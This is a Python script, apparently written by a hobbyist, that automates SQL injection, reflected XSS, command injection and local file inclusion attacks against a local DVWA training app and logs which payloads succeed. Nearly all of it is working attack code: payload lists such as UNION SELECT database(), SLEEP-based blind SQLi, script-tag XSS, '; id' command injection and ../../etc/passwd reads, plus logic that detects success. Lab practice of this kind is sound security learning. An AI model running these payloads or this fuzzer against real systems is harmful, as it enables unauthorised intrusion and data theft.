#!/usr/bin/env python3
"""
Simple web app fuzzer I wrote to automate testing SQLi and XSS payloads
against DVWA. Got tired of doing it manually in Burp, so built this.

Usage:
    1. Start DVWA: docker run -d -p 80:80 vulnerables/web-dvwa
    2. Log in at http://localhost, go to Setup and click Create Database
    3. Get your PHPSESSID from browser dev tools (Application > Cookies)
    4. Paste it into SESSION_COOKIE below
    5. Run: python3 fuzzer.py
"""

import requests
import time
from datetime import datetime

TARGET = "http://localhost"
SESSION_COOKIE = {"PHPSESSID": "YOUR_SESSION_ID_HERE", "security": "low"}
OUTPUT_FILE = "fuzzer_results.txt"

SQLI_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR 1=1-- -",
    "' UNION SELECT null,null-- -",
    "' UNION SELECT null,database()-- -",
    "1 AND SLEEP(3)-- -",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "'\"><script>alert(1)</script>",
    "<svg onload=alert('XSS')>",
]

CMDI_PAYLOADS = [
    "; id",
    "| id",
    "127.0.0.1; id",
    "127.0.0.1 && whoami",
]

LFI_PAYLOADS = [
    "../../etc/passwd",
    "../../../../../../etc/passwd",
    "php://filter/convert.base64-encode/resource=index.php",
]

SQLI_ERRORS = [
    "You have an error in your SQL syntax",
    "mysql_fetch",
    "Warning: mysql",
    "SQL syntax",
]

def log(msg, f):
    line = f"[{datetime.now().strftime('%H:%M:%S')}] {msg}"
    print(line)
    f.write(line + "\n")

def test_sqli(url, param, f):
    log(f"\n[SQLi] {url} | param={param}", f)
    found = []
    for payload in SQLI_PAYLOADS:
        try:
            start = time.time()
            r = requests.get(url, params={param: payload}, cookies=SESSION_COOKIE, timeout=8)
            elapsed = time.time() - start
            for err in SQLI_ERRORS:
                if err.lower() in r.text.lower():
                    log(f"  [VULN] Error-based SQLi -- payload: {payload}", f)
                    found.append(payload)
                    break
            if "SLEEP" in payload.upper() and elapsed > 2.5:
                log(f"  [VULN] Time-based blind SQLi -- took {elapsed:.1f}s", f)
                found.append(payload)
            time.sleep(0.2)
        except Exception as e:
            log(f"  [ERR] {e}", f)
    if not found:
        log("  [OK] No SQLi found", f)
    return found

def test_xss(url, param, f):
    log(f"\n[XSS]  {url} | param={param}", f)
    found = []
    for payload in XSS_PAYLOADS:
        try:
            r = requests.get(url, params={param: payload}, cookies=SESSION_COOKIE, timeout=8)
            if payload in r.text:
                log(f"  [VULN] Reflected XSS -- payload reflected: {payload}", f)
                found.append(payload)
            time.sleep(0.2)
        except Exception as e:
            log(f"  [ERR] {e}", f)
    if not found:
        log("  [OK] No reflected XSS found", f)
    return found

def test_cmdi(url, param, f):
    log(f"\n[CMDI] {url} | param={param}", f)
    found = []
    for payload in CMDI_PAYLOADS:
        try:
            r = requests.post(url, data={param: payload}, cookies=SESSION_COOKIE, timeout=8)
            for indicator in ["uid=", "root:", "www-data"]:
                if indicator in r.text:
                    log(f"  [VULN] Command injection -- saw '{indicator}'", f)
                    found.append(payload)
                    break
            time.sleep(0.2)
        except Exception as e:
            log(f"  [ERR] {e}", f)
    if not found:
        log("  [OK] No command injection found", f)
    return found

def test_lfi(url, param, f):
    log(f"\n[LFI]  {url} | param={param}", f)
    found = []
    for payload in LFI_PAYLOADS:
        try:
            r = requests.get(url, params={param: payload}, cookies=SESSION_COOKIE, timeout=8)
            for indicator in ["root:x:", "daemon:", "/bin/bash"]:
                if indicator in r.text:
                    log(f"  [VULN] LFI -- saw '{indicator}'", f)
                    found.append(payload)
                    break
            time.sleep(0.2)
        except Exception as e:
            log(f"  [ERR] {e}", f)
    if not found:
        log("  [OK] No LFI found", f)
    return found

def main():
    all_findings = []
    with open(OUTPUT_FILE, "w") as f:
        log(f"Fuzzer started -- {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", f)
        all_findings += [("SQLi", p) for p in test_sqli(f"{TARGET}/dvwa/vulnerabilities/sqli/", "id", f)]
        all_findings += [("XSS", p) for p in test_xss(f"{TARGET}/dvwa/vulnerabilities/xss_r/", "name", f)]
        all_findings += [("CMDI", p) for p in test_cmdi(f"{TARGET}/dvwa/vulnerabilities/exec/", "ip", f)]
        all_findings += [("LFI", p) for p in test_lfi(f"{TARGET}/dvwa/vulnerabilities/fi/", "page", f)]
        log(f"\nDone. {len(all_findings)} finding(s).", f)
        for t, p in all_findings:
            log(f"  [{t}] {p}", f)

if __name__ == "__main__":
    main()
